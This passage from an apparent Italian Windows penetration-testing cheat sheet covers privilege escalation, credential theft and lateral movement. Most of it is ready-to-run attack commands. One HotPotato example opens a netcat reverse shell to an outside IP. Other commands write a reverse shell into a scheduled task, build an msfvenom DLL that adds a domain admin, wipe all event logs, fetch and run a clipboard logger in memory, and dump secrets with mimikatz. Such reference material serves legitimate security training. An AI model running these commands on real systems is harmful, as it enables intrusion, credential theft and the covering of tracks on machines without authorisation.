tasklist /V | findstr <nome eseguibile> #comando che lista tutti i processi in verbose mode che poi manda a findstr per cercare il processo
```
- __StartUp directory:__

_La startup directory può essere utilizzata per il privilege escalation, ogni qualvolta vi è il boot del pc_
```cmd
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" #comando per vedere se abbiamo i permessi di writing sulla cartella StartUp
```
```vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\<word writable folder>\<nome eseguibile da usare>.exe"
oLink.Save #questo script in vbs permette di creare un collegamento nella directory startup che punterà ad un nostro eseguibile
```
- __Potato attacks:__

_I potato attacks sono una tipologia di privilege escalation di cui ogni tipo ha un nome a se_

__N.B: alcuni potato attacks potrebbero non più funzionare o essere stati fixxati, è bene prestare attenzione__

1) _Hot Potato:_

_L'hot potato sfrutta la misconfigurazione dei [WPAD](./#varie)(il record WPAD è sfruttato nella sezione varie di Privesc), in cui un computer windows cerca in autonomia le impostazioni per configurare il proxy, queste impostazioni sono passate tramite un file __"WPAD.dat"__ malevolo che redirige il traffico su un proxy malevolo e dove poi sarà possibile visionare il traffico della vittima_

_[Link](https://github.com/foxglovesec/Potato) per scaricare l'eseguibile_

_Comandi:_

```cmd
Hotpotato.exe -ip <ip macchina vittima> -cmd <comando da eseguire> -disable_exhaust true -disable_defender true #comandi per utilizzare l'attacco
```

ES: `Hotpotato.exe -ip 10.12.173.236 -disable_exhaust true -cmd “C:\Users\prova\Desktop\nc.exe 10.12.7.42 8080 -e cmd.exe” -disable_defender true`

__N.B: l'attacco è stato patchato con "MS16-077 WPAD Name" però ancora utilizzabile nelle macchine che non sono aggiornate__

2) _Rotten potato:_

_Il seguente attacco sfrutta: un fakeproxy locale, un RPC che gira con permessi di __"NT AUTHORITY\SYSTEM"__, RPC alla porta 135 e 2 API call __"CoGetInstanceFromIStorage"__ e __" AcceptSecurityContext "___

_Funzionamento:_

_API call "CoGetInstanceFromIStorage" contenente IP (127.0.0.1) e porta (6666) del proxy malevolo che obbligano RPC di SYSTEM ad autenticarsi e quindi ad inviare pure una __"NTLM negotiate"__ il proxy poi rigira il tutto alla porta 135 con RPC e tramite l'altra API call "AcceptSecurityContext" per forzare l'autenticazione locale.
Il tutto continua con la risposta __"NTLM Challenge"__ da parte della porta 135 e della API call "AcceptSecurityContext" verso il proxy malevolo, le 2 challenge vengono mischiate insieme per azzeccare la negoziazione verso RPC di SYSTEM se tutto andrà bene riceveremo una risposta __"NTLM Auth"__ da inviare alla API call "AcceptSecurityContext" per infine autenticarsi come SYSTEM_

_[Link](https://github.com/breenmachine/RottenPotatoNG) per scaricare l'eseguibile_

_Comandi:_
```cmd
whoami /priv #comando per controllare se abbiamo il privilegio SeImpersonatePrivilege
```
```cmd
use incognito #comando per caricare l'incognito in meterpreter
```
```cmd
MSFRottenPotato.exe t c:\windows\temp\test.bat #comando per avviare rottenpotato
```
_Rottenpotato a livello di codice sorgente aprirà sempre una shell se eseguito è possibile cambiare il suo effetto andando ad apportare modifiche al file "MSFRottenPotato.cpp" nel suo main ed infine ricompilarlo_

__N.B: Sopra a queste versioni Windows 10 1809 & Windows Server 2019 l'exploit non funzionerà più__

3) _Juicy potato:_

_Il funzionamento di juicy potato è identico a Rotten Potato solo che differisce per diversi aspetti: Il BITS(Background Intelligent Transfer Service) utilizzato per le API call non è disponibile e la porta 6666 è occupata.
Nonostante le differenze l'exploit è ancora sfruttabile poichè il BITS non è l'unico server COM disponibile(Component Object Model, servizio interno di windows che mette in comunicazione oggetti software in un ambiente windows) ma ce ne sono altri e la porta può essere cambiata_

_Comandi:_

_Primo passo capire che privilegi si hanno, quelli che interessano a noi sono __"SeImpersonate"__ o __"SeAssignPrimaryToken"___
```cmd
whoami /priv #comando per controllare se abbiamo il privilegio SeImpersonatePrivilege
```
_Una volta capiti i permessi dobbiamo capire quale CLSID (Class Identifier, un'identificatore globale ed univoco, esempio quello del BITS è 4991d34b-80a1-4291-83b6-3328366b9097) utilizzare, sono due i metodi_

- _Utilizzo del seguente [link](https://ohpe.it/juicy-potato/CLSID/) per la visione dei CLSID_

- _Utilizzo di due script il [primo](https://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1) per ottenere i CLSID e il [secondo](https://ohpe.it/juicy-potato/Test/) per testarli_

_Infine possiamo utilizzare lo [script](https://github.com/ohpe/juicy-potato) per l'exploit_

```cmd
juicypotato.exe -l <porta di ascolto> -p c:\windows\system32\cmd.exe -t <modalità per creare il processo> -c {<CLSID>} #comando per avviare una shell privilegiata tramite juicypotato
```
__N.B: Sopra a queste versioni Windows 10 1809 & Windows Server 2019 l'exploit non funzionerà più__

4) _Rogue Potato:_

_L'exploit rogue potato è possibile se abbiamo il controllo di una macchina vittima e se è accessibile la porta 135; sono 3 le componenti che prendono parte al funzionamento di rogue: RPC che runna come SYSTEM, un finto __"OXID RPC Resolver"__ (Object Exporter Identifier, sono identificatori univoci come i CLSID ma per oggetti che sono localizzati in remoto cioè su altri computers) e una named pipe_

_Funzionamento:_

_L'eseguibile di Rogue potato indica al RPC di system di inviare una __"OXIDquery"__ al finto resolver specificando in realtà l'ip dell'attaccante, l'ip dell'attaccante nel mentre tramite un forward con socat metterà in ascolto la porta 135 e la binderà con la porta 9999 della macchina vittima, nel giro che segue ritorniamo nella macchina vittima che tramite api call e la named pipe permetterà di eseguire comandi come SYSTEM_

_Comandi:_
```cmd
whoami /priv #comando per controllare se abbiamo il privilegio SeImpersonatePrivilege
```
```bash
socat tcp-listen:135,reuseaddr,fork tcp:<ip vittima>:9999 #comando per mettere in ascolto la porta 135 e bindarl con la 9999 della vittima
```
_[Link](https://github.com/antonioCoco/RoguePotato) per scarica la POC_
```cmd
.\RoguePotato.exe -r <ip della nostra machine> -e "<comando che vogliamo eseguire tipo una revshell>" -l 9999 #comando per avviare la POC
```

5) _Sweet Potato:_

_Sweet Potato è un insieme di vettori per il privilege escalation quali: Rotten Potato, Juicy Potato, PrintSpoofer e ecc..._

_Ecco il [Link](https://github.com/CCob/SweetPotato) per scaricare l'eseguibile_

__N.B: il print service non deve essere attivo__

6) _Generic Potato:_

_Generic potato è una versione modificata di Sweet potato che tenta di eseguire il privilege escalation tramite HTTP e named pipes_

_Vi sono dei requisiti per poterlo sfruttare: avere il privilegio "SeImpersonatePrivilege", il sistema non deve aver avviato il print service, WinRM è attivo (Running), non avere conessioni RPC in uscita verso macchine che controlliamo e il BITS service è disattivato_

_[Link](https://github.com/micahvandeusen/GenericPotato) per scaricare l'eseguibile_

7) _God Potato:_

_God Potato uno degli ultimi potato attacks creati, richiede di avere il privilegio "SeImpersonatePrivilege"_

_Comandi:_
```cmd
whoami /priv #comando per controllare i privilegi
```
_[Link](https://github.com/BeichenDream/GodPotato) per scaricare God potato_
```cmd
GodPotato.exe -cmd "<comando da eseguire esempio una revshell>" #comando per utilizzare GodPotato
```

- __PrintSpoofer:__

_I privilegi SeAssignPrimaryToken o SeImpersonatePrivilege permettono ad un utente di runnare codice o creare nuovi processi in account di altri utenti, l'exploit lanciato da local o da un network service permette di diventare SYSTEM_

- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) = tool che controlla se l'user ha il SeImpersonatePrivilege e poi fa il Privilege escalation a SYSTEM

_Comandi:_
```powerhsell
PrintSpoofer.exe -i -c <nome comando> #comando per avviare l'eseguibile Printspoofer
```
- __Scheduled Tasks:__

_Vettori di privilege escalation possono provenire da task creati mal configurati_

_Comandi:_
```cmd
schtasks /query /fo LIST /v #comando per listare tutti i tasks
```
```cmd
schtasks /query /tn <nome task> /fo list /v #comando per ottenere info su un task
```
```cmd
Task to Run: #parametro che indica cosa runna il task 
```
```cmd
Run as User: #parametro che indica quale user che lo runna
```
```cmd
icacls <Path eseguibile nel parametro Task to run> #andiamo a vedere i permessi che abbiamo sull'eseguibile
```
```cmd
echo c:\<path nostro eseguibile> -e cmd.exe <ip> <porta> > <path da sostituire del parametro Task to run> #comando che in questo caso inserisce una revshell
```
```cmd
schtasks /run /tn vulntask #comando per avviare il task
```
- __SeTakeOwnerShip:__

_Questo privilegio permette di prendere il controllo di ogni oggetto del sistema, incluso file, chiavi di registro o servizi ed è molto probabile che possa essere utilizzato per prendere di mira oggetti che runnino come SYSTEM_

_Comandi:_ 
```cmd
whoami /priv #comando per vedere i propri privilegi
```
```cmd
takeown /f C:<path eseguibile> #comando che permette di prenderne il controllo
```
```cmd   
icacls C:\Windows\System32\Utilman.exe /grant <nome account>:F #Avendo il controllo non per forza abbiamo i permessi necessari, ma comunque con il SeTakeOwnerShip possiamo ottenerli con il seguente comando che modifica le ACL
```
```cmd  
copy cmd.exe <nome eseguibile> #comando per sostituire l'eseguibile 
```  
_Esiste una repo molto interessante dove, vi sono diverse POC per sfruttare i vari privilegi assegnati come nel caso del SeTakeOwnerShip è possibile trovare tutto [qui](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC), inoltre voglio allegare uno script .ps1 che se nel caso il privilegio fosse disattivato abbiamo buone probabilità di riattivarlo, è possibile trovarlo [qui](https://github.com/fashionproof/EnableAllTokenPrivs)_

- __Unpatched Software:__

_Nella macchina target, possono esserci dei software non aggiornati all'ultima versione che possono essere vettori di Privilege escalation_

_Comandi:_
```cmd  
wmic product get name,version,vendor #comando per listare software e info, non funziona sempre per tutti i programmi
```
```powershell 
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -ne $null } | Select- 
Object DisplayName, DisplayVersion, InstallLocation | Sort-Object -Property DisplayName -Unique | Format-Table -AutoSize #comando powershell più corposo per listare i programmi, dovrebbe essere più performante
``` 
- __Named pipes:__

_Le named pipes mettono in comunicazione processi o applicazioni tra di loro, sono una sorta di file che vivono in memoria e che vengono eliminate una volta lette._

_Comandi:_
```powershell  
gci \\.\pipe\ #comando powershell per listare le named pipes
```
```cmd  
accesschk.exe /accepteula -w \\.\Pipe\<named pipe> -v #comando per vedere i permessi dati ad una named pipe
``` 
_Un esempio di exploit è la named pipe __"pipe\WindscribeService"__, che permette di eseguire programmi con privilegi di amministratore, è possibile sfruttarlo a nostro vantaggio tramite il modulo di [metasploit](./#metasploit) chiamato __"exploit/windows/local/windscribe_windscribeservice_priv_esc"___

- __SeDebugPrivilege:__

_Il privilegio SeDebugPrivilege permette ad un utente di avere enormi poteri, in quanto permette di: prendere informazioni sensibili dalla memoria di sistema, accedere o modificare il kernel ed applicazioni, ecc..._

_Comandi:_

_Un possibile sfruttamento di questo privilegio è tramite lo script .ps1 chiamato [psgetsys](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1), lo script permetterà di creare un processo figlio, il quale erediterà il token dei permessi da un processo padre che runna come SYSTEM_
```powershell 
import-module .\psgetsys.ps1 #comando per importare il .ps1
```
```powershell 
Get-Process <processo privilegiato> #comando per prendere il pid del processo privilegiato
```
```powershell 
[MyProcess]::CreateProcessFromParent("<pid processo>","<comando da eseguire>", "") #comando per eseguire l'exploit
``` 
_Esiste una repo molto interessante dove, vi sono diverse POC per sfruttare i vari privilegi assegnati come nel caso del SeDebugPrivilege è possibile trovare tutto [qui](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC), inoltre voglio allegare uno script .ps1 che se nel caso il privilegio fosse disattivato abbiamo buone probabilità di riattivarlo, è possibile trovarlo [qui](https://github.com/fashionproof/EnableAllTokenPrivs)_

- __Gruppi built-in:__

_I windows gruppi built-in sono gruppi di sicurezza che vengono creati quando viene installato windows stesso, questi gruppi conferiscono privilegi speciali ai membri del loro gruppo e quindi possono essere vettore per di privilege escalation_

1) _Backup Operators:_

_Il Backup Operators dispone di 2 privilegi molto importanti SeBackup e SeRestore, in parole povere permettono lettura e scrittura di ogni file del sistema ignorando le ACE, gli stessi privilegi sono utilizzati in una tecnica di persistenza proprio [qui](https://github.com/AleHelp/Windows-Pentesting-cheatsheet/blob/main/#privilegi)_

_Comandi:_

_Impostazioni di default settano il privilegio __"SeBackup"__, in modalità disattivato ma tramite questo [script](https://github.com/giuliano108/SeBackupPrivilege) potremmo riattivarlo ed oltre a questo ci fornirà alcuni comandi utili_
```cmd 
whoami /priv #comando per vedere i nostri prvilegi, SeBackup risulterà disattivato
```
```powershell 
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll #comandi che importano i moduli delle utils e cmdlets dello script
```
```powershell 
Set-SeBackupPrivilege #comando dello script che riattiva il privilegio
```
```powershell
Copy-FileSeBackupPrivilege '<path file da copiare>' <path file da salvare> #comando dello script che tramite il privilegio ci permette di copiare ogni file
```
2) _Event Log Readers:_

_Gruppo che ha i permessi per vedere, modificare i log di sistema_

_Comandi:_
```cmd
net localgroup "Event Log Readers" #comando per vedere i membri del gruppo
```
```powershell
wevtutil qe <tipologia evento> /rd:true /f:text | Select-String "<stringa da cercare>" #comando che fa una query dei log più recenti che poi vengono formattati in testo per poi cercare parole chiavi
```
```powershell
wevtutil el | Foreach-Object {wevtutil cl "$_"} #comando per eiliminare i log di sistema
```
3) _DnsAdmins:_

_Il gruppo DnsAdmins permette di visionare le informazioni del DNS come gruppo e forse uno dei più utili per il privilege escalation in quanto il servizio DNS è runnato da SYSTEM quindi l'user più forte nel sistema_

__N.B: il seguente tipo di privilege escalation è possibile quando il DNS è stato avviato nel domain controller, se facciamo parte del gruppo DnsAdmins e se abbiamo i privilegi di stoppare e avviare i servizi__

_Comandi:_
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <nome utente> /add /domain' -f dll -o <nome dll>.dll #comando di msfvenom che genera un dll malevola con al suo interno un comando CMD per aggiungere un utente al gruppo domain admins e che verrà utilizzata per essere injectata nella configurazione del dns target
```
_La dll malevola va spostata nella macchina target_
```cmd
dnscmd.exe /config /serverlevelplugindll <full path dll malevola>.dll #comando che tramite l'eseguibile dnscmd cambie le impostazioni dns andando ad inserire la dll malevola come plugin server
```
__N.B: il comando di sopra può essere lanciato solo da membri del gruppo DnsAdmins__

_Ora dobbiamo stoppare e riavviare il servizio dns ma per farlo prima bisogna controllare se abbiamo i permessi per farlo_
```cmd
wmic useraccount where name="<nome utente>" get sid #comand CMD che recuperare il nostro SID, questo servirà per vedere se il SID ha i permessi necessari per il servizio
```
```cmd
sc.exe sdshow dns #comando che mostra il security descriptor(SID) del servizio DNS, nell'output dovrà comparire il sid del nostro utente con i dovuti permessi
```
```cmd
sc stop dns
sc start dns #comandi per fermare e poi riavviare il servizio dns
```
_Ora fare il logoff per applicare le modifiche e poi rientrare_
```cmd
net localgroup "domain admins" #comando che lista i membri del gruppo, di cui il nostro utente farà parte
```
_Infine se vogliamo ripulire il tutto dopo aver fatto_
```cmd
reg delete \HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll #comando per eliminare le tracce della modifica
```
```cmd
sc stop dns
sc start dns #comandi che stoppano e avviano il servizio dns per applicare le nuove modifiche
```
 - _WPAD record:_

_WPAD record (Web Proxy Auto-Discovery), è un record all'interno dell'AD che permette ai dispostivi di trovare automaticamente il server proxy; il gruppo __"DnsAdmins"__ permette di configurare la __"lista globale di blocco delle query del server DNS"__, una lista dove troviamo bloccati anche i WPAD record; l'attacco consiste nel disattivare la lista globale e poi aggiungere una WPAD record che punti al nostro pc dove avremmo avviato responder in ascolto delle macchine vittime che hanno l'impostazione WPAD attiva_

_Comandi:_
```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <nome server dns> #comando per disattivare le global query su una determinata macchina
```
```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName <nome zona> -ComputerName <nome server dns> -IPv4Address <ip macchina> #comando per aggiungere il WPAD record
```
4) _Hyper-V Administrators:_

_E' il gruppo che ha il controllo totale sulle funzioni dell'Hyper-V, questo gruppo tramite questo [script](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) ci permetterà di diventare SYSTEM_

5) _Print Operators:_

_Il gruppo print operators tramite il privilegio __"SeLoadDriverPrivilege"__, permette i diritti di accedere, modificare e eliminare tutte i printers collegate ad un Domain Controller_

_Comandi:_
```cmd
whoami /priv #comando per listare i nostri permessi
```
_Potremmo notare che il privilegio SeLoadDriverPrivilege sarà disattivato, il primo passo è di utilizzare seguente [script](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)_
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h" #include che vanno aggiunti al codice dello script
```
```cmd
cl /DUNICODE /D_UNICODE <nome file script>.cpp #comando per compilare lo script, in questo caso viene utilizzato cl.exe di Visual Studio
```
_Il secondo passo è di abusare del driver [__"Capcom.sys"__](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), il seguente driver permette ad ogni utente di eseguire [shellcode](./#shellcode) con privilegi di SYSTEM_

__N.B: il driver se non presente va scaricato e passato alla target machine__
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\<path del driver>" #comando che aggiunge una subkey ImagePath al driver vulnerabile
#la notazione \??\ è una notazione interna che dice di interpretarla in questa maniera C:\<path driver>
```
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1 #comando che aggiunge una subkey di nome type e la setta a 1
```
_Terzo passo, utilizzare lo script caricato in precedenza, attivare il privilegio e controllare se il driver è stato caricato, per visionare il driver utilizziamo il seguente [tool](https://www.nirsoft.net/utils/driverview-x64.zip)_
```cmd
.\<nome script>.exe #comando che avvia l'eseguibile per attivare il privilegio SeLoadDriverPrivilege
```
```cmd
.\DriverView.exe #comando che avvia il tool per vedere i driver
```
```powershell
.\DriverView.exe /stext <nome file>.txt
cat <nome file>.txt | Select-String -pattern Capcom #comandi powershell che possono semplificare la ricerca
```

_Infine con il seguente [script](https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom) che va compilato potremmo ottenere una shell con privilegi SYSTEM_
```cmd
.\ExploitCapcom.exe #comando per avviare l'eseguibile
```
```cmd 
reg delete HKCU\System\CurrentControlSet\Capcom #comando per ripulire le chiavi di registro
``` 
__N.B: Capita che non si disponga di GUI per utilizzare ExploitCapcom, in questo caso alla linea 292 "TCHAR CommandLine[] = "<comando_da_cambiare>");" del codice invece di creare una shell in locale possiamo fargli aprire un'eseguibile con all'interno una revshell che punti alla nostra macchina__

_Esiste come al solito un tool che automatizza i passi svolti sopra è chiamato [EopLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)_     

6) _Server Operators:_

_Il gruppo Server Operators permette di amministrare un windows server senza la necessità dei privilegi di domain admin, in questo gruppo ritroviamo i 2 privilegi __"SeBackup"__ e __"SeRestore"___

_Comandi:_
```cmd 
sc qc <nome servizio> #comando che fa una query ad un servizio
``` 
_converrebbe a noi di cercare un servizio che sia avviato dall'account __"SYSTEM"__ e possiamo vedere i permessi con un'utility chiamata [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) della [suite sysinternal-processi](./#processi)_
```powershell 
.\PsService.exe security <nome servizio> #comando per ottenere informazioni sul servizio, rispetto a sc ci fornisce maggiore output
``` 
__N.B: le stesse informazioni possono essere ottenute dal comando "sc", l'utility "PsService" può risultare più veloce nel pratico__
 
_Una volta trovato il servizio dove il nostro gruppo ha come privilegi __"all"__, cambiamo il __"binary path name"___
```cmd 
sc config <nome servizio> binPath= "cmd /c net localgroup Administrators <nome utente> /add" #comando che cambia il binary path name di un servizio con un comando CMD che aggiunge un nostro utente al gruppo degli Administrators
``` 
_Ora da qui in poi possiamo accedere al domain controller come parte del gruppo amministratore_

- __ClipBoard Logger:__

_Fonte di informazioni può essere il copia e incolla continuo di un utente_

_Comandi:_
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1') #comando per runnare lo script direttamente in memoria
```
```powershell
Invoke-ClipboardLogger #comando per avviare lo script
```

- __SQLAdmin:__

_il diritto SQLAdmin permette di amministrare le istanze SQL e se abbiamo le corrette credenziali di chi possiede il diritto possiamo utilizzarlo_

__N.B: le istanze di mysql sono utilizzate in una tecnica di persistence visionabile [qui](./#varie-1)__

1) _PowerUpSQL:_

_[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) script in .ps1 che permette di interagire con l'istanza del db_

_Comandi:_
```powerhsell
Import-Module .\PowerUpSQL.ps1 #comando per importare il modulo
```
```powershell
Get-SQLInstanceDomain #comando che recupera informazioni sulle istanze di SQL
```
```powershell
Get-SQLQuery -Verbose -Instance "<ip target>,<porta>" -username "<dominio>\<utente>" -password "<password>" -query '<query>' #comando che tramite autenticazione esegue una query
```
2) _mssqlclient.py:_

_La suite [Impacket](https://github.com/AleHelp/Windows-Pentesting-cheatsheet/tree/main#impacket) tramite lo script mssqlclient.py permette di interagire con il db_

-  __Kerberos Delegation:__

_Le kerberos delegation permettono ad un servizio o applicazione di utilizzare le proprie credenziali kerberos a nome di un altro utente, esistono 3 tipi di delegation: Unconstrained Delegation, Constrained Delegation e Resource-based Delegation_

1) Unconstrained Delegation = il più permissivo permette ad un servizio o applicazione di presentare le proprie credenziali a chiunque

2) Constrained Delegation = meno permissivo perchè al servizio o applicazione viene specificato solo a quali altri poter dare le proprie credenziali kerberos

3) Resource-based Delegation = in questo caso le policy di delegazione sono all'interno della risorsa stessa (servizio, computer, applicazione) e specificherà chi può presentare le credenziali kerberos

- _Constrained Delegation:_

_Comandi:_

_Il primo passo è enumerare il sistema per vedere eventuali delegazione (vedere voce __"msds_allowedtodelegateto"__) e lo facciamo tramite [powerview](./#Powerview)_
```powershell
Import-Module .\PowerView.ps1 #comando per importare powerview
```
```powershell
Get-NetUser -TrustedToAuth #comando powerview per vedere le delegazioni
```
_Utilizziamo mimikatz per recuperare le credenziali dell'user che ha le delegation_
```cmd
mimikatz.exe token::elevate #comando per impersonare SYSTEM
```
```cmd    
mimikatz.exe lsadump::secrets #comando per recuperare credenziali in chiaro
```
_Continuiamo con il tool [Rubeus](https://github.com/GhostPack/Rubeus) per trasformare la password in NTLM hash_
```cmd
Rubeus.exe hash /password:<password> #comando per convertire la password in NTLM hash
```
```cmd
Rubeus.exe s4u /user:<nome utente con delegation> /rc4:<NTLM hash> /domain:<dominio> /impersonateuser:<user per cui richiedere TGT da kerberos> /msdsspn:"<SPN domain controller>" /dc:<domain controller> /ptt #comando che utilizzando l'utente con constrained delegation richiede il TGT ad un'altro utente
```
```cmd
klist #comando per vedere i ticket in cache e se sono stati injectati
```
- _Resource-based Delegation:_

_Comandi:_

_Il primo passo è enumerare il sistema per vedere eventuali delegazione e lo facciamo tramite [powerview](./#Powerview)_
```powershell
Import-Module .\PowerView.ps1 #comando per importare powerview
```
```powershell
Get-NetUser -TrustedToAuth #comando powerview per vedere le delegazioni
```
_Utilizziamo mimikatz per recuperare le credenziali dell'user che ha le delegation_
```cmd
mimikatz.exe token::elevate #comando per impersonare SYSTEM
```
```cmd    
mimikatz.exe lsadump::secrets #comando per recupere credenziali in chiaro
```
_Ora utilizziamo [kekeo](https://github.com/gentilkiwi/kekeo), tool per convertire i ticket o injectarli_
```cmd
tgt::ask /user:<utente> /domain:<dominio> /password:<password> #comando per creare TGT
```
```cmd
tgs::s4u /tgt:<nome TGT creato> kirbi /user:<nome user da impersonare> /service:<nome servizio da impersonare> #comando per creare il TGS all'utente da impersonare
```
_Infine con mimikatz importiamo i ticket TGS_
```cmd
kerberos::ptt <nome ticket>.kirbi #comando per passare il ticket
```
_Da qui in poi potremmo ora utilizzare il servizio tramite delegation_

- __Responder e Inveigh:__

_utilizzo di responder che tramite LLMNR(Link-Local Multicast Name Resolution poisoning) recupera le credenziali in chiaro._
```bash
sudo responder -I <interfaccia di rete>
```
_[Inveigh](https://github.com/Kevin-Robertson/Inveigh) e [](), script simile a responer ma utilizzabile in macchine windows_
```powershell
Import-Module .\Inveigh.ps1 #comando per importare il .ps1 Inveigh
```
```powershell
(Get-Command Invoke-Inveigh).Parameters #comando per aprire l'help dei comandi
```
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y #comando completo dello script
```

- __Mitm:__
```bash
sudo python3 mitm6.py -i <interfaccia di rete> -d <nome dominio target> #tool utilizzato per il man in the middle in ipv6
```

### Tools:

 - [Winpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20230910-ae32193f) = tool molto potente per cercare possibili privesc

 - [PrivescCheck](https://github.com/itm4n/PrivescCheck) = alternativa a Winpeas se non si vuole eseguire un file binario

 - [Wesng](https://github.com/bitsadmin/wesng) = python script meno rumoroso rispetto a winpeas

 __N.B prima di startare wesng utilizzare il comando __"wes.py --update"__ per aggiornare il db, poi runnare il comando __"systeminfo"__ ed infine per avviare lo script utilizzare il seguente comando __"wes.py systeminfo.txt"__

 - [SharpUp](https://github.com/GhostPack/SharpUp)

_Allegato qui è possibile trovare il [link](https://lolbas-project.github.io/) ad un repo contenente alcuni __"LOLBAS"__(Living Off The Land Binaries)_

### Lateral movements:

##### Lanciare comandi da remoto:

- __Psexec64:__

_Caricando sulla macchina che abbiamo o se gia presente il tool [psexec64.exe](https://learn.microsoft.com/it-it/sysinternals/downloads/psexec) (integrato nella suite sysinternal di windows), permette di poter lanciare comandi da remoto, richiede di far parte degli Administrator group o avere dei poteri d'amministratore_

_Comandi:_
```cmd
psexec64.exe \\<ip macchina> -u <user> -p <password> -i <commando> #comando per lanciare da remoto, i doppi backslash sono per quando utilizzamo SMB sennò basta mettere un ip normale
```
- __WinRM:__

_WinRm permette di poter utilizzare una shell o lanciare comandi powershell sempre da remoto, il gruppo richiesto è quello dei Remote Managemnet Users:_ 

_Comandi:_
```powershell
$username = '<user>';
$password = '<passowrd>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; #comando per creare l'oggetto PSSCredential
```
```powershell       
Enter-PSSession -Computername <ip> -Credential $credential #comando per entrate nella sessione
```
```powershell       
Invoke-Command -Computername <ip> -Credential $credential -ScriptBlock {whoami} #comando per lanciare altri comandi da remoto
```
- __SC.exe:__

_sc.exe permette di creare processi da remoto e lo fa tramite DCE/RPC:_

_Funzionamento:_

 1) connessione alla porta 135 che è quella del EPM(Endpoint Mapper) un servizio del protocollo DCE/RPC che indica indirizzo e la porta per un servizio, EPM.

 2) EPM indica ip e porta (range da 49152 a 65535) del SVCCTL (Service Control Manager Interface) API per comunicare con il service control manager

 2.2) se la connessione tramite RPC fallisce il client prova tramite SMB named pipes o SMB con Netbios.

 _Comandi:_
```cmd
sc.exe \\<ip> create <nome servizio> binPath= "<path binario>" #comando per creare il servizio
```
```cmd       
sc.exe \\<ip> start <nome servizio> #comando per startarlo
```
```cmd       
sc.exe \\<ip> stop <nome servizio> #comando per stopparlo
```
```cmd       
sc.exe \\<ip> delete <nome servizio> #comando per eliminarlo
```
- __Task scheduler:__

_Tramite schtasks possiamo creare dei tasks da remoto che in un determinato tempo si ripetono, gruppo richiesto Administrators group o avere dei privilegi_

_Comandi:_
```cmd
schtasks /s <ip> /RU "SYSTEM" /create /tn "<nome task>" /tr "<comando>" /sc ONCE /sd 01/01/1970 /st 00:00 #comando per creare un taks con diversi parametri
```
```cmd  
schtasks /s <ip> /run /TN "<nome task>"  #comando per avviarlo
```
```cmd       
schtasks /S <ip> /TN "<nome task>" /DELETE /F #comando per eliminarlo
```
- __WMI:__

_WMI(Windows Management Instrumentation) è utilizzato per la gestione delle risorse locali e di rete, possiamo persino creare processi, servizi e schedule tasks e fa tutto questo da remoto tramite 2 protocolli DCOM (RPC over IP) o Wsman (WinRM)_

__gruppo richiesto Administrators group__

_Porte 135, 49152-65535 (DCERPC) DCOM è un'estensione del DCERPC_

_5985/TCP (WinRM HTTP) o 5986/TCP (WinRM HTTPS)_

_Comandi per creare una sessione:_
```powershell
$username = '<user>';
$password = '<passowrd>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; #comando per creare l'oggetto PSSCredential
```
```powershell
$Opt = New-CimSessionOption -Protocol DCOM #comando che crea un oggetto CIM in cui è specificato il protocollo DCOM 
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop #comando che crea la sessione CMI
#CMI è strettamente correlato con WMI
```

_Comandi per creare un processo da remoto:_
```powershell
$Command = "<comando da inserire>"; #variabile contente il processo
```
ES: `powershell.exe -Command Set-Content -Path C:\Windows\hello.txt -Value hello`

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command} #comando per creare il processo
```
```cmd
wmic.exe /user:<nome utente> /password:<password> /node:<ip> process call create <comando>" #stesso comando ma per CMD
```   

_Comandi per creare un servizio da remoto:_
```powershell
Invoke-CimMethod -CimSession <sessione> -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "<nome servizio";
DisplayName = "<nome>";
PathName = "<comando>";
ServiceType = [byte]::Parse("16"); # Win32OwnProces
StartMode = "Manual"
} #comando con relativi dettagli per creare un servizio
```
```powershell 
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'" #variabile che contiene informazioni per creare 
l'handle del servizio
```
```powershell 
